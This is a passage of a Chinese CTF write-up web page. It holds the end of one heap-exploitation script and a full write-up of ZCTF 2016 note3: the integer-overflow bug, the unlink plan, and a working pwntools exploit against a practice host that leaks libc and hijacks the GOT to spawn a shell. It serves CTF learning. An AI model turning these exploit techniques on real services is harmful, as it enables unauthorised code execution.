<span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Robot&#39;s name: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">start_robot</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">overflow_benderinuse</span><span class="p">(</span><span class="n">inuse</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;9999&#39;</span> <span class="o">+</span> <span class="n">inuse</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">):</span>
    <span class="n">change</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">where</span><span class="p">))</span>
    <span class="n">change</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">what</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="nb">print</span> <span class="s2">&quot;step 1 - fastbin attack&quot;</span>
    <span class="c1"># add a fastbin chunk 0x20 and free it</span>
    <span class="c1"># fastbin 指针指向：2 bender-&gt;NULL</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1"># 2 bender</span>
    <span class="n">remove</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="c1"># off-by-one 覆写 idx2 inuse 为 1 让我们能编辑</span>
    <span class="n">overflow_benderinuse</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="c1"># 覆写 fd 2 0x603138, point to 2 bender&#39;s size,后面伪造堆fd就是destructor_size</span>
    <span class="c1"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span>
    <span class="n">change</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x603138</span><span class="p">))</span>
    <span class="c1"># off-by-one 覆写 idx2 inuse 为 1</span>
    <span class="c1"># 让我们再一次申请 2 bender</span>
    <span class="n">overflow_benderinuse</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="c1"># add 2 bender again, fastbin 0x603138-&gt;NULL</span>
    <span class="c1"># 将原来 2 bender 空间申请出来</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="c1"># in order to malloc chunk at 0x603138</span>
    <span class="c1"># 绕过fastbin size 检查：将size位伪造一个fastbin范围的值</span>
    <span class="c1"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span>
    <span class="c1"># 0x603140 是 3 Devil 的size位，申请fastbin范围即可</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>
    <span class="c1"># trigger malloc, set tinny point to 0x603148</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="c1"># 释放无用堆</span>
    <span class="c1"># wheels must &lt;= 3</span>
    <span class="c1"># only save tinny(0x603138)</span>
    <span class="n">remove</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">remove</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

    <span class="nb">print</span> <span class="s1">&#39;step 2 - unlink&#39;</span>
    <span class="c1"># alloc 6 destructor size 60-&gt;0x50, chunk content 0x40</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
    <span class="c1"># alloc 3 devil, size=20*7=140, bigger than fastbin</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>
    <span class="c1"># edit destructor&#39;s size to 1000 by tinny</span>
    <span class="n">change</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1000</span><span class="p">))</span>
    <span class="c1"># gdb.attach(p)</span>
    <span class="c1"># place fake chunk at destructor&#39;s pointer</span>
    <span class="n">fakechunk_addr</span> <span class="o">=</span> <span class="mh">0x6030E8</span>
    <span class="n">fakechunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fakechunk_addr</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span>
        <span class="n">fakechunk_addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
    <span class="n">fakechunk</span> <span class="o">=</span> <span class="n">fakechunk</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>
    <span class="n">fakechunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">)</span>
    <span class="n">change</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">fakechunk</span><span class="p">)</span>
    <span class="c1"># trigger unlink</span>
    <span class="n">remove</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

    <span class="nb">print</span> <span class="s1">&#39;step 3 - hijack chunk1 ptr&#39;</span>
    <span class="c1"># make 0x6030F8 point to 0x6030E8</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6030E8</span><span class="p">)</span>
    <span class="n">change</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="nb">print</span> <span class="s1">&#39;step 4 - hijack exit.got&#39;</span>
    <span class="c1"># make exit just as return</span>
    <span class="n">write</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">],</span> <span class="mh">0x401954</span><span class="p">)</span>

    <span class="nb">print</span> <span class="s1">&#39;step 5&#39;</span>
    <span class="c1"># set wheel cnt =3, 0x603130 in order to start robot</span>
    <span class="n">write</span><span class="p">(</span><span class="mh">0x603130</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
    <span class="c1"># set destructor point to puts@got</span>
    <span class="n">change</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]))</span>
    <span class="n">start_robot</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;New hands great!! Thx &#39;</span><span class="p">)</span>
    <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;puts addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
    <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>

    <span class="c1"># make free-&gt;system</span>
    <span class="n">write</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">],</span> <span class="n">system_addr</span><span class="p">)</span>
    <span class="c1"># make destructor point to /bin/sh addr</span>
    <span class="n">write</span><span class="p">(</span><span class="mh">0x6030E8</span><span class="p">,</span> <span class="n">binsh_addr</span><span class="p">)</span>
    <span class="c1"># get shell</span>
    <span class="n">remove</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="k">pass</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</code></pre></div>
<h2 id="zctf-2016-note3">ZCTF 2016 note3<a class="headerlink" href="#zctf-2016-note3" title="Permanent link">&para;</a></h2>
<h3 id="_20">基本情况<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h3>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
</code></pre></div>
</td></tr></table>
<h3 id="_21">基本功能<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h3>
<p>基本堆管理，有增删改功能。</p>
<p>堆数量上限为 8 个，大小在 0~1024 之间自定义。堆指针指针和 size 分别用一个列表存放，结合后面推测出，qword_6020C0[0] 为一个缓冲区，存储刚刚操作的完的 chunk_ptr 。</p>
<h3 id="_22">漏洞<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h3>
<p>delete 和 edit 读取序号时有点特殊，将输入值经过加密后的结果直接当做是下标，<strong>没有再进一步检查下标是否非法的</strong>：</p>
<div class="highlight"><pre><span></span><code><span class="n">v3</span> <span class="o">=</span> <span class="n">v0</span> <span class="o">-</span> <span class="mi">7</span> <span class="o">*</span> <span class="p">(((</span><span class="kt">signed</span> <span class="kr">__int64</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="n">__int128</span><span class="p">)(</span><span class="mf">5270498306774157605L</span><span class="n">L</span> <span class="o">*</span> <span class="p">(</span><span class="kt">signed</span> <span class="n">__int128</span><span class="p">)</span><span class="n">v0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">v0</span> <span class="o">&gt;&gt;</span> <span class="mi">63</span><span class="p">));</span>
</code></pre></div>
<p>这里存在一个整型溢出，当输入值为 0x8000000000000000 ，结果为 -1 ，这样就将修改缓冲区的堆块，修改程度为 chunk7 地址：</p>
<div class="highlight"><pre><span></span><code>.bss:
current_ptr &lt;== edit ptr
note0_ptr
note1_ptr
note2_ptr
note3_ptr
note4_ptr
note5_ptr
note6_ptr
note7_ptr   &lt;== size
note0_size
note1_size
note2_size
note3_size
note4_size
note5_size
note6_size
note7_size
</code></pre></div>
<p>由于输入长度有限，所以将原值转换为负数：<code>0x8000000000000000 - 0x10000000000000000</code> 。</p>
<h3 id="_23">思路<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h3>
<ol>
<li>利用整型漏洞，形成一个堆溢出。修改 next_chunk 的 header 信息，构造 unlink 条件。</li>
<li>unlink 后控制 chunk_ptr 指针，实现任意地址读写。由于程序输出功能，将 free 改为 puts 用来泄露地址，然后在将 free 改为 system 。</li>
</ol>
<h3 id="exp_2">EXP<a class="headerlink" href="#exp_2" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>

<span class="c1"># p = process(&quot;./note3&quot;)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;node3.buuoj.cn&quot;</span><span class="p">,</span><span class="mi">25763</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./note3&quot;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;1024)</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;note:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;note:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>


<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s1">&#39;skyedidi&#39;</span><span class="p">)</span>

<span class="n">ptr</span> <span class="o">=</span> <span class="mh">0x6020d8</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ptr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ptr</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mh">0x8000000000000000</span> <span class="o">-</span> <span class="mh">0x10000000000000000</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;skyedidi&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020c0</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])[:</span><span class="mi">7</span><span class="p">])</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">puts_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;puts_leak:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_leak</span><span class="p">))</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_leak</span> <span class="o">-</span> <span class="mh">0x06f690</span><span class="c1">#libc.sym[&#39;puts&#39;]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x045390</span><span class="c1">#libc.sym[&#39;system&#39;]</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x18cd57</span><span class="c1">#next(libc.search(&#39;/bin/sh&#39;))</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)[:</span><span class="mi">7</span><span class="p">])</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;skyedidi&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="c1"># gdb.attach(p)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            <span>&copy; 2021</span>by <a href="https://www.mrskye.cn/" target="_blank">SkYe231</a> &nbsp;|&nbsp; <span><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备20056619号</a></span>
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/vendor.93c04032.min.js"></script>
      <script src="../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "../../..",
          features: ['tabs', 'instant'],
          search: Object.assign({
            worker: "../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
    
  </body>
</html>